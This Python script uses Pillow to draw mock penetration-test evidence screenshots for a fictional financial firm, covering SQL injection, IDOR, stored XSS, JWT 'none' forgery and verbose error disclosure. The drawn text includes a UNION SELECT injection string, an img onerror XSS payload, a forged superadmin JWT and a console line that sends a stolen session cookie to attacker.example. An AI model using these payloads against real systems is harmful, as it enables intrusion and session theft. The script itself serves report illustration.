#!/usr/bin/env python3
"""
Generate mock pentest evidence screenshots using Pillow.
Each image simulates a real tool output or browser capture.
"""

from PIL import Image, ImageDraw, ImageFont
import os

OUT = "/home/claude/evidence"
os.makedirs(OUT, exist_ok=True)

# Use default font (monospace-like)
try:
    mono = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 13)
    mono_sm = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 11)
    mono_lg = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 14)
    sans = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
    sans_bold = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 13)
    sans_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 15)
except:
    mono = ImageFont.load_default()
    mono_sm = mono
    mono_lg = mono
    sans = mono
    sans_bold = mono
    sans_title = mono

BG_DARK = (30, 30, 40)
BG_TERMINAL = (18, 22, 28)
BG_BURP = (44, 44, 54)
TEXT_GREEN = (0, 220, 100)
TEXT_WHITE = (230, 230, 230)
TEXT_GREY = (160, 165, 175)
TEXT_ORANGE = (255, 165, 50)
TEXT_RED = (255, 80, 80)
TEXT_CYAN = (80, 210, 255)
TEXT_YELLOW = (255, 220, 80)
ACCENT_BLUE = (0, 160, 245)
HIGHLIGHT_RED = (120, 30, 30)
TAB_BG = (55, 55, 68)
TAB_ACTIVE = (70, 70, 90)


def draw_topbar(draw, w, title, tabs=None):
    """Draw a dark tool-like top bar with title and optional tabs."""
    # Title bar
    draw.rectangle([0, 0, w, 32], fill=(40, 40, 52))
    draw.text((12, 7), title, fill=TEXT_GREY, font=sans_bold)
    # Window buttons
    for i, color in enumerate([(255, 95, 87), (255, 189, 46), (39, 201, 63)]):
        draw.ellipse([w - 80 + i*22, 10, w - 68 + i*22, 22], fill=color)
    # Tabs
    if tabs:
        y = 32
        draw.rectangle([0, y, w, y + 28], fill=TAB_BG)
        x = 8
        for i, tab in enumerate(tabs):
            tw = len(tab) * 8 + 20
            bg = TAB_ACTIVE if i == 0 else TAB_BG
            draw.rectangle([x, y + 2, x + tw, y + 26], fill=bg)
            draw.text((x + 10, y + 6), tab, fill=TEXT_WHITE if i == 0 else TEXT_GREY, font=mono_sm)
            x += tw + 4
        return y + 28
    return 32


def draw_status_bar(draw, w, h, text):
    draw.rectangle([0, h - 22, w, h], fill=(35, 35, 48))
    draw.text((10, h - 18), text, fill=TEXT_GREY, font=mono_sm)


# ═══════════════════════════════════════════════════════════════
# 1. VULN-001: SQL Injection — Burp Suite Repeater
# ═══════════════════════════════════════════════════════════════
def gen_sqli():
    w, h = 820, 520
    img = Image.new('RGB', (w, h), BG_DARK)
    draw = ImageDraw.Draw(img)

    y = draw_topbar(draw, w, "Burp Suite Professional v2025.12", ["Repeater", "Intruder", "Scanner"])

    # Split: Request (left) | Response (right)
    mid = w // 2
    draw.line([(mid, y), (mid, h - 22)], fill=(60, 60, 75), width=2)

    # Request panel
    draw.text((10, y + 6), "Request", fill=ACCENT_BLUE, font=sans_bold)
    ry = y + 26
    req_lines = [
        ("GET ", TEXT_CYAN),
        ("/v2/transactions?account_id=", TEXT_WHITE),
        ("1' UNION SELECT NULL,", TEXT_RED),
    ]
    draw.text((10, ry), "GET ", fill=TEXT_CYAN, font=mono)
    draw.text((42, ry), "/v2/transactions?account_id=", fill=TEXT_WHITE, font=mono)
    ry += 18
    # Highlight the injection payload
    draw.rectangle([10, ry - 1, mid - 10, ry + 32], fill=HIGHLIGHT_RED)
    draw.text((14, ry), "  1' UNION SELECT NULL,version(),", fill=TEXT_YELLOW, font=mono)
    ry += 16
    draw.text((14, ry), "  current_user,NULL,NULL-- -", fill=TEXT_YELLOW, font=mono)
    ry += 22

    for line, color in [
        ("Host: api.apexfs.com", TEXT_WHITE),
        ("Authorization: Bearer eyJhbG...[REDACTED]", TEXT_GREY),
        ("Accept: application/json", TEXT_GREY),
        ("User-Agent: Mozilla/5.0", TEXT_GREY),
        ("Connection: close", TEXT_GREY),
    ]:
        draw.text((10, ry), line, fill=color, font=mono_sm)
        ry += 16

    # Response panel
    draw.text((mid + 10, y + 6), "Response  [200 OK]  238ms", fill=TEXT_GREEN, font=sans_bold)
    ry = y + 26
    draw.text((mid + 10, ry), "HTTP/1.1 200 OK", fill=TEXT_GREEN, font=mono)
    ry += 16
    for hdr in ["Content-Type: application/json", "X-Request-Id: a8f3...b2c1", "Server: nginx/1.24"]:
        draw.text((mid + 10, ry), hdr, fill=TEXT_GREY, font=mono_sm)
        ry += 15
    ry += 10
    draw.text((mid + 10, ry), '{"transactions": [{', fill=TEXT_WHITE, font=mono)
    ry += 17
    draw.text((mid + 14, ry), '"id": null,', fill=TEXT_GREY, font=mono)
    ry += 17
    # Highlight the extracted data
    draw.rectangle([mid + 10, ry - 2, w - 10, ry + 34], fill=HIGHLIGHT_RED)
    draw.text((mid + 14, ry), '"description":', fill=TEXT_WHITE, font=mono)
    ry += 17
    draw.text((mid + 20, ry), '"PostgreSQL 14.9 on x86_64"', fill=TEXT_RED, font=mono_lg)
    ry += 22
    draw.text((mid + 14, ry), '"amount": "apexfs_app",', fill=TEXT_ORANGE, font=mono)
    ry += 17
    draw.text((mid + 14, ry), '"date": null,', fill=TEXT_GREY, font=mono)
    ry += 17
    draw.text((mid + 14, ry), '"category": null', fill=TEXT_GREY, font=mono)
    ry += 17
    draw.text((mid + 10, ry), "}]}", fill=TEXT_WHITE, font=mono)

    # Red annotation arrow
    ax, ay = mid + 200, ry + 40
    draw.text((ax, ay), "◄ DB version + user leaked", fill=TEXT_RED, font=sans_bold)

    draw_status_bar(draw, w, h, "Target: api.apexfs.com | Method: GET | Status: 200 | Length: 238 bytes")
    img.save(f"{OUT}/vuln001_sqli_burp.png")
    print("  ✓ vuln001_sqli_burp.png")


# ═══════════════════════════════════════════════════════════════
# 2. VULN-002: IDOR — API response comparison
# ═══════════════════════════════════════════════════════════════
def gen_idor():
    w, h = 820, 440
    img = Image.new('RGB', (w, h), BG_DARK)
    draw = ImageDraw.Draw(img)

    y = draw_topbar(draw, w, "Burp Suite Professional v2025.12", ["Repeater", "Comparer"])

    # Request
    draw.text((10, y + 6), "Request (as User A, account 10042)", fill=ACCENT_BLUE, font=sans_bold)
    ry = y + 28
    for line in [
        "GET /api/accounts/10043/profile HTTP/1.1",
        "Host: portal.apexfs.com",
        "Authorization: Bearer eyJ[...USER_A_TOKEN...]",
        "Cookie: session=abc123def456",
    ]:
        c = TEXT_ORANGE if "10043" in line else TEXT_WHITE if "GET" in line else TEXT_GREY
        draw.text((10, ry), line, fill=c, font=mono)
        ry += 16

    # Divider
    ry += 8
    draw.line([(10, ry), (w - 10, ry)], fill=(60, 60, 75), width=1)
    ry += 8

    # Response — another user's data
    draw.text((10, ry), "Response — User B's data returned to User A", fill=TEXT_RED, font=sans_bold)
    ry += 22
    draw.text((10, ry), "HTTP/1.1 200 OK", fill=TEXT_GREEN, font=mono)
    ry += 20

    json_lines = [
        ('{', TEXT_WHITE),
        ('  "account_id": 10043,', TEXT_WHITE),
        ('  "name": "Jane M. Doe",', TEXT_ORANGE),
        ('  "email": "j.doe@example.com",', TEXT_ORANGE),
        ('  "ssn_last4": "7291",', TEXT_RED),
        ('  "date_of_birth": "1988-03-14",', TEXT_ORANGE),
        ('  "balance": "$42,817.33",', TEXT_RED),
        ('  "linked_cards": [', TEXT_RED),
        ('    {"last4": "4532", "type": "Visa"},', TEXT_RED),
        ('    {"last4": "8901", "type": "Mastercard"}', TEXT_RED),
        ('  ]', TEXT_WHITE),
        ('}', TEXT_WHITE),
    ]
    for line, color in json_lines:
        if color == TEXT_RED:
            draw.rectangle([8, ry - 1, w - 8, ry + 15], fill=HIGHLIGHT_RED)
        draw.text((14, ry), line, fill=color, font=mono)
        ry += 16

    # Annotation
    draw.rectangle([w - 280, ry + 8, w - 10, ry + 52], fill=(60, 30, 30))
    draw.text((w - 272, ry + 12), "⚠ Full PII + financial data", fill=TEXT_RED, font=sans_bold)
    draw.text((w - 272, ry + 30), "  of another user exposed", fill=TEXT_ORANGE, font=sans)

    draw_status_bar(draw, w, h, "Target: portal.apexfs.com | Horizontal privilege escalation confirmed")
    img.save(f"{OUT}/vuln002_idor_response.png")
    print("  ✓ vuln002_idor_response.png")


# ═══════════════════════════════════════════════════════════════
# 3. VULN-003: Stored XSS — browser console + cookie theft
# ═══════════════════════════════════════════════════════════════
def gen_xss():
    w, h = 820, 400
    img = Image.new('RGB', (w, h), BG_TERMINAL)
    draw = ImageDraw.Draw(img)

    y = draw_topbar(draw, w, "Chrome DevTools — support.apexfs.com", ["Elements", "Console", "Network"])

    # Simulated browser showing the ticket
    draw.rectangle([10, y + 8, w - 10, y + 65], fill=(40, 42, 52))
    draw.text((20, y + 12), "Support Ticket #4892 — Subject:", fill=TEXT_GREY, font=sans)
    draw.text((280, y + 12), "<img src=x onerror=\"fetch(...)\">", fill=TEXT_RED, font=mono)
    draw.text((20, y + 34), "Agent viewing ticket triggers JavaScript execution", fill=TEXT_ORANGE, font=sans)

    # Console output
    cy = y + 80
    draw.text((10, cy), "Console", fill=ACCENT_BLUE, font=sans_bold)
    cy += 22

    console_lines = [
        ("▶ ", TEXT_GREY, "document.cookie"),
        ("", TEXT_WHITE, ""),
        ("◀ ", TEXT_GREEN, '"session=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWdlbnQi...;'),
        ("", TEXT_WHITE, ""),
        ("▶ ", TEXT_GREY, "// Attacker's server received:"),
        ("", TEXT_WHITE, ""),
        ("[Network] ", TEXT_ORANGE, "GET https://attacker.example/steal?c=session%3DeyJhbG..."),
        ("", TEXT_WHITE, ""),
        ("         ", TEXT_RED, "⚠ Support agent session token exfiltrated"),
        ("         ", TEXT_RED, "  Agent role: admin (elevated privileges)"),
    ]

    for prefix, color, text in console_lines:
        if "exfiltrated" in text or "elevated" in text:
            draw.rectangle([8, cy - 1, w - 8, cy + 15], fill=HIGHLIGHT_RED)
        draw.text((14, cy), prefix + text, fill=color, font=mono)
        cy += 17

    # Annotation box
    draw.rectangle([w - 320, cy + 10, w - 10, cy + 50], fill=(60, 30, 30))
    draw.text((w - 312, cy + 14), "Cookie stolen → Agent session hijacked", fill=TEXT_RED, font=sans_bold)
    draw.text((w - 312, cy + 32), "Attacker gains admin-level access", fill=TEXT_ORANGE, font=sans)

    draw_status_bar(draw, w, h, "XSS payload executed in agent browser context | Session: admin")
    img.save(f"{OUT}/vuln003_xss_console.png")
    print("  ✓ vuln003_xss_console.png")


# ═══════════════════════════════════════════════════════════════
# 4. VULN-004: JWT none algorithm — decoded token
# ═══════════════════════════════════════════════════════════════
def gen_jwt():
    w, h = 820, 400
    img = Image.new('RGB', (w, h), BG_DARK)
    draw = ImageDraw.Draw(img)

    y = draw_topbar(draw, w, "jwt_tool v2.2.7 — Token Analysis")

    # Header section
    ty = y + 12
    draw.text((10, ty), "HEADER (decoded):", fill=ACCENT_BLUE, font=sans_bold)
    ty += 22
    draw.rectangle([10, ty, 390, ty + 55], fill=(35, 40, 50))
    draw.text((18, ty + 4), "{", fill=TEXT_WHITE, font=mono)
    draw.text((18, ty + 18), '  "alg": "none",', fill=TEXT_RED, font=mono_lg)
    draw.text((18, ty + 36), '  "typ": "JWT"', fill=TEXT_WHITE, font=mono)
    ty_end = ty + 55
    draw.text((18, ty_end + 2), "}", fill=TEXT_WHITE, font=mono)

    # Arrow annotation for "none"
    draw.text((400, ty + 14), "◄── Algorithm set to 'none'", fill=TEXT_RED, font=sans_bold)
    draw.text((400, ty + 34), "     Signature verification bypassed!", fill=TEXT_ORANGE, font=sans)

    # Payload section
    ty = ty_end + 28
    draw.text((10, ty), "PAYLOAD (decoded):", fill=ACCENT_BLUE, font=sans_bold)
    ty += 22
    draw.rectangle([10, ty, 390, ty + 90], fill=(35, 40, 50))
    payload_lines = [
        '{',
        '  "sub": "admin",',
        '  "role": "superadmin",',
        '  "email": "admin@apexfs.com",',
        '  "iat": 1706640000',
        '}',
    ]
    py = ty + 4
    for line in payload_lines:
        c = TEXT_RED if "superadmin" in line or "admin" in line.split('"sub"') else TEXT_WHITE
        if "superadmin" in line:
            draw.rectangle([12, py - 1, 388, py + 15], fill=HIGHLIGHT_RED)
            c = TEXT_RED
        draw.text((18, py), line, fill=c, font=mono)
        py += 16

    draw.text((400, ty + 20), "◄── Forged admin identity", fill=TEXT_RED, font=sans_bold)
    draw.text((400, ty + 40), "     Full superadmin access granted", fill=TEXT_ORANGE, font=sans)

    # Signature section
    ty = py + 16
    draw.text((10, ty), "SIGNATURE:", fill=ACCENT_BLUE, font=sans_bold)
    ty += 20
    draw.rectangle([10, ty, 390, ty + 22], fill=HIGHLIGHT_RED)
    draw.text((18, ty + 3), "[EMPTY — no signature required]", fill=TEXT_RED, font=mono)

    draw_status_bar(draw, w, h, "jwt_tool | Algorithm: none | Token accepted by auth.apexfs.com ✓")
    img.save(f"{OUT}/vuln004_jwt_none.png")
    print("  ✓ vuln004_jwt_none.png")


# ═══════════════════════════════════════════════════════════════
# 5. VULN-005: Verbose error — stack trace disclosure
# ═══════════════════════════════════════════════════════════════
def gen_verbose():
    w, h = 820, 420
    img = Image.new('RGB', (w, h), BG_TERMINAL)
    draw = ImageDraw.Draw(img)

    y = draw_topbar(draw, w, "Terminal — curl response")

    ty = y + 10
    draw.text((10, ty), "$ curl -s 'https://api.apexfs.com/v2/transactions?account_id=\\''", fill=TEXT_GREEN, font=mono)
    ty += 24

    error_lines = [
        ('HTTP/1.1 500 Internal Server Error', TEXT_RED),
        ('', TEXT_WHITE),
        ('{', TEXT_WHITE),
        ('  "error": "PG::SyntaxError",', TEXT_RED),
        ('  "detail": "unterminated quoted string at or near', TEXT_ORANGE),
        ('             at character 47",', TEXT_ORANGE),
        ('  "backtrace": [', TEXT_GREY),
        ('    "/opt/app/lib/controllers/txn_controller.rb:142",', TEXT_YELLOW),
        ('    "/opt/app/lib/models/transaction.rb:87",', TEXT_YELLOW),
        ('    "/opt/app/vendor/bundle/gems/pg-1.5.4/lib/pg.rb:58",', TEXT_GREY),
        ('    "/opt/app/vendor/bundle/gems/rails-7.1/activerecord',TEXT_GREY),
        ('         /lib/active_record/base.rb:340"', TEXT_GREY),
        ('  ],', TEXT_WHITE),
        ('  "db_connection": "postgres://apexfs_app:****@', TEXT_RED),
        ('                    db-prod-01.internal:5432/apexfs_prod",', TEXT_RED),
        ('  "ruby_version": "3.2.2",', TEXT_ORANGE),
        ('  "rails_version": "7.1.3",', TEXT_ORANGE),
        ('  "server_hostname": "api-prod-node-03"', TEXT_ORANGE),
        ('}', TEXT_WHITE),
    ]

    for line, color in error_lines:
        if color == TEXT_RED and "db_connection" in line:
            draw.rectangle([8, ty - 1, w - 8, ty + 15], fill=HIGHLIGHT_RED)
        if color == TEXT_RED and "5432" in line:
            draw.rectangle([8, ty - 1, w - 8, ty + 15], fill=HIGHLIGHT_RED)
        draw.text((14, ty), line, fill=color, font=mono_sm)
        ty += 16

    draw.text((w - 350, ty + 6), "⚠ Internal paths, DB creds, versions exposed", fill=TEXT_RED, font=sans_bold)

    draw_status_bar(draw, w, h, "Response includes: file paths, DB connection string, framework versions")
    img.save(f"{OUT}/vuln005_verbose_error.png")
    print("  ✓ vuln005_verbose_error.png")


if __name__ == "__main__":
    print("Generating evidence screenshots...")
    gen_sqli()
    gen_idor()
    gen_xss()
    gen_jwt()
    gen_verbose()
    print(f"\nAll images saved to {OUT}/")
